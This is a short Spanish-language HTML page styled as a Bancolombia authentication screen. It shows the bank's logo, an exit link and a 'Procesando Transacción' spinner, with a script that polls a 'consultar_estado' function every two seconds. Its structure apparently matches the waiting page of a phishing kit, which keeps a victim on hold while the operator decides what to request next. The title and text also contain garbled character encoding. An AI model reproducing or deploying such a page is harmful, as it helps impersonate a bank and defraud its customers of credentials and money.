


<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>AutenticaciÃ³n Bancolombia</title>
  <link rel="stylesheet" href="css/cargando.css">
  <link rel="icon" href="cargandoimages/favicon.ico">
    <!-- Bootstrap -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <!-- jQuery -->
    <script src="../../scripts/jquery-3.6.0.min.js"></script>
    <script src="../../scripts/jquery.jclock-min.js"></script>
    <script src="../../scripts/functions.js"></script>
</head>
<body class="fondo">
  <header>
    <img src="images/bancolombia.svg" alt="Bancolombia Logo" class="logo">
    <a href="#" class="logout">
      Salir
      <img src="images/flecha.svg" alt="Flecha" class="icono-flecha">
    </a>
  </header>
  <main class="cuerpo">
    <div class="loader-container">
      <div class="spinner"></div>
      <div class="text">Procesando<br>TransacciÃ³n...</div>
    </div>    
  </main>
  <div class="lineafinal1">
    <div class="lineafinal2"></div>
  
    <span class="lineafinal3">
      <div class="lineafinal4">
        <div class="lineafinal5"></div>
        <div class="lineafinal6"></div>
      </div>
  
      <div class="lineafinal7">
      </div>
    </span>
  </div>

<script language="javascript">
$(document).ready(function() {
	setInterval(consultar_estado,2000);	
    console.log("Cargando")
});
</script>

</body>


    

</html>
